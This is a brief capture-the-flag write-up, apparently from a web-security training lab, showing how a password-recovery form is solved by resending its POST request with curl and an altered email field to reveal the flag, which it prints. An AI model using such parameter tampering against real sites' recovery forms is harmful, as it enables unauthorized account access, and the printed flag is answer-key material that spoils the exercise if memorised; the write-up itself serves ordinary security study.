There is a sign in page in the site that has a recover page.

It just have a button for submiting the form.

If we look at the request sent, it has this content for body :

mail=webmaster%40borntosec.com&Submit=Submit

This data is sent with the HTTP header :

Content-Type: application/x-www-form-urlencoded

With cURL, we can resend the request but change the email.

curl --location 'http://172.16.91.134/?page=recover' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'mail=wil@borntosec.comd' \
--data-urlencode 'Submit=Submit'

As you can see here, i changed a bit the email address. If i send this request, i can find this part in the response :

```
<section id="main" class="wrapper">
				<div class="container" style="margin-top:75px">
<center><h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
```

So we got the flag : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
